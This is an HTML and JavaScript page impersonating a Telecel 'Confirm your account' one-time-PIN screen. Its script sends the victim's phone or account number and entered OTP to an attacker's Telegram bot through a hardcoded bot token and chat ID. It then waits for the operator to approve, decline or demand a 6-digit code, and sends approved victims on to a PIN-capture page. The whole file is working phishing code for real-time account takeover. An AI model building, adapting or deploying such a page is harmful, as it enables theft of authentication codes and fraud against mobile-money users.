<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Telecel OTP</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{
  box-sizing: border-box;
  font-family: 'Inter', Arial, sans-serif;
}

body{
  margin: 0;
  background: #f5f5f5;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 16px;
}

/* CONTAINER */
.container{
  width: 360px;
  background: #f7f7f7;
  border-radius: 28px;
  padding: 40px 20px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
  position: relative;
  overflow: hidden;
  text-align: center;
}

/* RED SHAPE */
.top-bg{
  position: absolute;
  top: 0;
  right: 0;
  width: 220px;
  height: 220px;
  background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
  border-bottom-left-radius: 120px;
}

.content{
  position: relative;
  z-index: 2;
}

/* LOGO */
.logo{
  margin-top: 60px;
}

.logo-circle{
  width: 52px;
  height: 52px;
  background: #ff0000;
  border-radius: 50%;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 30px;
  margin: auto;
  font-weight: 800;
}

.logo-text{
  color: #ff0000;
  font-size: 26px;
  font-weight: bold;
  margin-top: 8px;
}

/* TEXT */
.title{
  color: #ff0000;
  font-size: 20px;
  font-weight: 600;
  margin-top: 15px;
}

.subtitle{
  color: #666;
  font-size: 15px;
  margin-top: 10px;
  line-height: 1.5;
}

/* OTP BOXES (5 digits) */
.otp-container{
  display: flex;
  gap: 12px;
  margin-top: 20px;
  justify-content: center;
}

.otp-input{
  flex: 1;
  min-width: 0;
  height: 50px;
  border-radius: 12px;
  border: 1px solid #ddd;
  text-align: center;
  font-size: 20px;
  font-weight: 600;
  outline: none;
  background: #fff;
  transition: border 0.2s;
}

.otp-input:focus{
  border: 2px solid #ff0000;
  box-shadow: 0 0 0 2px rgba(255,0,0,0.1);
}

/* BUTTONS */
.btn{
  width: 100%;
  height: 55px;
  border: none;
  border-radius: 14px;
  font-size: 16px;
  margin-top: 20px;
  cursor: pointer;
  font-weight: 600;
}

.btn-primary{
  background: #ff0000;
  color: #fff;
}

.btn-primary.disabled, .btn-primary:disabled{
  background: #e5e5e5;
  color: #999;
  cursor: not-allowed;
}

.btn-outline{
  background: transparent;
  border: 2px solid #ff0000;
  color: #666;
  font-weight: 600;
}

/* Message styling */
.message {
  font-size: 14px;
  margin-top: 8px;
  min-height: 20px;
}
.error { color: #dc3545; }
.success { color: #28a745; }

/* ERROR BOX */
.error-box{
  position: absolute;
  top: 20px;
  left: 20px;
  right: 20px;
  background: #fff;
  border: 2px solid #ff4d4d;
  border-radius: 12px;
  padding: 15px;
  display: none;
  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
  z-index: 100;
  text-align: left;
}

.error-title{
  color: #ff0000;
  font-weight: bold;
  margin-bottom: 5px;
}

.error-text{
  color: #444;
  font-size: 14px;
}

.close{
  position: absolute;
  right: 15px;
  top: 10px;
  cursor: pointer;
  font-size: 18px;
  color: #999;
}

/* SPINNER OVERLAY */
#spinner {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(2px);
  z-index: 999;
}

.loader {
  width: 44px;
  height: 44px;
  border: 4px solid #ffe0e0;
  border-top: 4px solid #ff0000;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>
<body>

<div class="container">
  <div class="top-bg"></div>

  <!-- ERROR BOX -->
  <div class="error-box" id="errorBox">
    <div class="close" onclick="hideError()">×</div>
    <div class="error-title">Error</div>
    <div class="error-text" id="errorText">Wrong OTP</div>
  </div>

  <div class="content">
    <!-- LOGO -->
    <div class="logo">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel</div>
    </div>

    <!-- TEXT -->
    <div class="title">Confirm your account</div>
    <div class="subtitle" id="subtitleText">
      The One Time Pin has been sent to<br>
      <span id="maskedPhone">02xxxxxx20</span>
      . Enter it below to verify your account.
    </div>

    <!-- OTP INPUT SECTION (5 digits) -->
    <div id="otpSection">
      <div class="otp-container">
        <input class="otp-input" maxlength="1" id="otp1" autofocus>
        <input class="otp-input" maxlength="1" id="otp2">
        <input class="otp-input" maxlength="1" id="otp3">
        <input class="otp-input" maxlength="1" id="otp4">
        <input class="otp-input" maxlength="1" id="otp5">
      </div>
      <div class="message" id="otpMessage"></div>
      <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
    </div>

    <!-- Go Back button -->
    <button class="btn btn-outline" id="goBackBtn">Go Back</button>
  </div>
</div>

<!-- SPINNER OVERLAY -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
  (function() {
    // ==================== TELEGRAM BOT CONFIG ====================
    const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
    const CHAT_ID   = '1006917440';
    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // ==================== DOM ELEMENTS ====================
    const otpInputs = [
      document.getElementById('otp1'),
      document.getElementById('otp2'),
      document.getElementById('otp3'),
      document.getElementById('otp4'),
      document.getElementById('otp5')
    ];
    const nextBtn = document.getElementById('nextBtn');
    const goBackBtn = document.getElementById('goBackBtn');
    const maskedPhoneSpan = document.getElementById('maskedPhone');
    const subtitleDiv = document.getElementById('subtitleText');
    const otpMessage = document.getElementById('otpMessage');
    const spinner = document.getElementById('spinner');
    const errorBox = document.getElementById('errorBox');
    const errorText = document.getElementById('errorText');

    // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
    const phone = sessionStorage.getItem('telecel_phone') || '0200000020';
    const accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
    const inputValue = sessionStorage.getItem('telecel_inputValue') || '';

    // ==================== MASK PHONE NUMBER ====================
    function maskPhone(phone) {
      const cleaned = phone.replace(/\D/g, '');
      if (cleaned.length >= 4) {
        const start = cleaned.slice(0, 2);
        const end = cleaned.slice(-2);
        const masked = start + 'x'.repeat(Math.max(0, cleaned.length - 4)) + end;
        return masked;
      }
      return phone;
    }
    maskedPhoneSpan.textContent = maskPhone(phone);

    // ==================== OTP AUTO‑ADVANCE (5 digits) ====================
    function focusNext(index) {
      if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
    }
    function focusPrev(index) {
      if (index > 0) otpInputs[index - 1].focus();
    }

    function updateNextButton() {
      const allFilled = otpInputs.every(inp => inp.value.length === 1);
      nextBtn.disabled = !allFilled;
      if (allFilled) {
        nextBtn.classList.remove('disabled');
      } else {
        nextBtn.classList.add('disabled');
      }
    }

    otpInputs.forEach((input, idx) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1) focusNext(idx);
        updateNextButton();
        otpMessage.textContent = ''; // clear message on edit
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (this.value.length === 0 && idx > 0) {
            e.preventDefault();
            focusPrev(idx);
          }
        } else if (e.key === 'ArrowLeft') {
          e.preventDefault();
          focusPrev(idx);
        } else if (e.key === 'ArrowRight') {
          e.preventDefault();
          focusNext(idx);
        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
          e.preventDefault();
        }
      });
    });

    // ==================== ERROR HANDLING ====================
    function showError(message) {
      errorText.innerText = message || 'An error occurred';
      errorBox.style.display = 'block';
    }

    window.hideError = function() {
      errorBox.style.display = 'none';
    };

    // ==================== TELEGRAM HELPERS ====================
    function escapeHtml(unsafe) {
      return unsafe.replace(/[&<>"]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        if (m === '"') return '&quot;';
        return m;
      });
    }

    async function sendToTelegram(payload) {
      const url = `${API_BASE}/sendMessage`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        return await response.json();
      } catch (error) {
        console.error('Telegram send error:', error);
        throw error;
      }
    }

    let currentPollInterval = null;

    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
      if (currentPollInterval) clearInterval(currentPollInterval);

      let lastUpdateId = 0;

      currentPollInterval = setInterval(async () => {
        try {
          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
          const response = await fetch(url);
          const data = await response.json();
          if (!data.ok || !data.result.length) return;

          data.result.forEach(update => {
            lastUpdateId = update.update_id;
            if (update.callback_query && update.callback_query.data) {
              const parts = update.callback_query.data.split('_');
              if (parts.length >= 3) {
                const [type, action, time] = parts;
                if (time == expectedTs && type === expectedPrefix) {
                  clearInterval(currentPollInterval);
                  currentPollInterval = null;
                  onDecision(action);
                }
              }
            }
          });
        } catch (err) {
          console.warn('Polling error:', err);
        }
      }, 1500);
    }

    // ==================== OTP SUBMISSION ====================
    let isSubmitting = false;

    async function submitOtp() {
      if (isSubmitting) return;

      const enteredOtp = otpInputs.map(inp => inp.value).join('');
      if (enteredOtp.length !== 5) {
        otpMessage.textContent = 'Please enter all 5 digits.';
        otpMessage.className = 'message error';
        return;
      }

      isSubmitting = true;
      nextBtn.disabled = true;
      otpInputs.forEach(inp => inp.disabled = true);
      spinner.style.display = 'flex';

      const ts = Date.now();
      const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
      const escapedOtp = escapeHtml(enteredOtp);
      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nChoose action:`;

      await sendToTelegram({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
            { text: '6 OTP', callback_data: `otp_6otp_${ts}` },
            { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
          ]]
        }
      });

      pollForCallback('otp', ts, (action) => {
        spinner.style.display = 'none';
        isSubmitting = false;

        if (action === 'approve') {
          window.location.href = 'pin.html';
        } else if (action === '6otp') {
          // Redirect to 6-digit OTP page (same session data stays)
          sessionStorage.setItem('wrongOtp5', 'true');
          window.location.href = 'otp6.html';
        } else if (action === 'decline') {
          showError('Wrong OTP');
          // Reset OTP inputs for new attempt
          otpInputs.forEach(inp => {
            inp.value = '';
            inp.disabled = false;
          });
          otpInputs[0].focus();
          updateNextButton();
          nextBtn.disabled = false;
        }
      });
    }

    nextBtn.addEventListener('click', submitOtp);

    // ==================== GO BACK ====================
    goBackBtn.addEventListener('click', () => {
      window.location.href = 'login.html';
    });

    // ==================== INIT ====================
    updateNextButton();
  })();
</script>

</body>
</html>
